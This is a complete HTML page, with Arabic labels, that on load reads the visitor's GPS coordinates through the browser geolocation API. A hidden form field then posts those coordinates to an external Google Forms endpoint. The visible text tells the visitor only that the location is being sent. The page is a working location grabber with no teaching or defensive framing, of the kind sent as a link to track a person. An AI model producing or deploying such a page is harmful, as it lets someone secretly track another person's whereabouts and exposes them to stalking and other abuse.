<html>
<head>
  <meta charset="UTF-8">
  <title>إرسال الموقع تلقائيًا</title>
  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;
          var location = latitude + ',' + longitude;

          var form = document.createElement("form");
          form.method = "POST";
          form.action = "https://docs.google.com/forms/d/e/1FAIpQLSeQknNyvwD7ZEHuf5H_XDzZvrvYph9ZwpiNjjRFniDOXpNSYw/formResponse";

          var locField = document.createElement("input");
          locField.type = "hidden";
          locField.name = "entry.1298276845";  // الحقل الخاص بالموقع
          locField.value = location;
          form.appendChild(locField);

          document.body.appendChild(form);
          form.submit();
        });
      } else {
        alert("الموقع غير مدعوم في هذا المتصفح.");
      }
    }
  </script>
</head>
<body onload="sendLocation()">
  <h3>جارٍ إرسال الموقع الجغرافي...</h3>
</body>
